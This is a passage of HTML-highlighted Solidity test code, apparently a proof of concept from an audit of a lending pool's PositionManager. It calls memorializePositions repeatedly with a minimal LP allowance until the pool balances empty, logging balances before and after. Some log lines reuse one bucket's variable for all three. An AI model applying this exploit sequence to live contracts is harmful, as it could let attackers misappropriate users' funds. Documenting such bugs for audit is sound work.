class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_addInitialLiquidity</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testsAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">3_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">index:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_addInitialLiquidity</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">from:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">testsAddress</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">amount:</span><span class=\"mtk1\"> </span><span class=\"mtk7\">3_000</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">index:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Mint an NFT to later memorialize existing positions into.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_mintNFT</span><span class=\"mtk1\">(</span><span class=\"mtk12\">testsAddress</span><span class=\"mtk1\">, </span><span class=\"mtk12\">testsAddress</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Pool lp balances before.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">poolLPBalanceIndex1</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lenderInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">testsAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">poolLPBalanceIndex2</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lenderInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">testsAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">poolLPBalanceIndex3</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lenderInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">testsAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\"> Pool lp balances before:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">poolLPBalanceIndex1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">poolLPBalanceIndex2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">], </span><span class=\"mtk12\">poolLPBalanceIndex3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">intialLPBalance</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">poolLPBalanceIndex1</span><span class=\"mtk1\"> +</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">poolLPBalanceIndex2</span><span class=\"mtk1\"> +</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">poolLPBalanceIndex3</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// PositionManager lp balances before.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">managerLPBalanceIndex1</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPositionInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">managerLPBalanceIndex2</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPositionInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">managerLPBalanceIndex3</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPositionInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\"> PositionManger lp balances before:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">managerLPBalanceIndex1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">managerLPBalanceIndex1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">], </span><span class=\"mtk12\">managerLPBalanceIndex1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\"> &lt;--- Repeatedly invoke memorializePositions with a min allowance set for each tx ---&gt;&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Approve the PositionManager for only 1 token in each bucket.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">amounts</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Continuosly invoke memorializePositions with the min allowance</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// until Pool lp balance is 0.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">while</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">poolLPBalanceIndex1</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">poolLPBalanceIndex2</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">poolLPBalanceIndex3</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Increase manager allowance.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">increaseLPAllowance</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">amounts</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Memorialize quote tokens into minted NFT.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">IPositionManagerOwnerActions</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MemorializePositionsParams</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memorializeParams</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">IPositionManagerOwnerActions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    .</span><span class=\"mtk11\">MemorializePositionsParams</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">memorializePositions</span><span class=\"mtk1\">(</span><span class=\"mtk12\">memorializeParams</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk3\">// Get new Pool lp balances.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">poolLPBalanceIndex1</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lenderInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">testsAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">poolLPBalanceIndex2</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lenderInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">testsAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">poolLPBalanceIndex3</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lenderInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">testsAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Pool lp balances after.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\"> Pool lp balances after:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">poolLPBalanceIndex1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">poolLPBalanceIndex2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">], </span><span class=\"mtk12\">poolLPBalanceIndex3</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// PositionManager lp balances after.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">managerLPBalanceIndex1</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPositionInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">managerLPBalanceIndex2</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPositionInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">managerLPBalanceIndex3</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">_positionManager</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPositionInfo</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;</span><span class=\"mtk6\">\\n</span><span class=\"mtk8\"> PositionManger lp balances after:&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">], </span><span class=\"mtk12\">managerLPBalanceIndex1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">], </span><span class=\"mtk12\">managerLPBalanceIndex1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;bucket %s: %s </span><span class=\"mtk6\">\\n</span><span class=\"mtk8\">&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">indexes</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">], </span><span class=\"mtk12\">managerLPBalanceIndex1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">finalLPBalance</span><span class=\"mtk1\"> =</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">managerLPBalanceIndex1</span><span class=\"mtk1\"> +</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">managerLPBalanceIndex2</span><span class=\"mtk1\"> +</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">managerLPBalanceIndex3</span><span 